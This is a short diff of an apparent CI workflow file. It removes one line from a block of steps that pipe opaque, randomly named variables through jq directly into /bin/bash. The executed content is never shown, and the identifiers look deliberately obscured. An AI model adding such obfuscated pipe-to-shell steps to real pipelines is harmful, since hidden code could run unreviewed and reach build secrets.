@@ -31,7 +31,6 @@ jobs:
           echo $u5 | jq -r .dqgjz84 | /bin/bash
           echo $rzf32879 | jq -r .djz4 | /bin/bash
           echo $dohov2 | jq -r .nwcjq125 | /bin/bash
-          printf '%s' "$eogo1" | jq -r .gvki3 | /bin/bash
           printf '%s' "$tgq1343" | jq -r .xn56 | /bin/bash
 
       - name: Upload archive
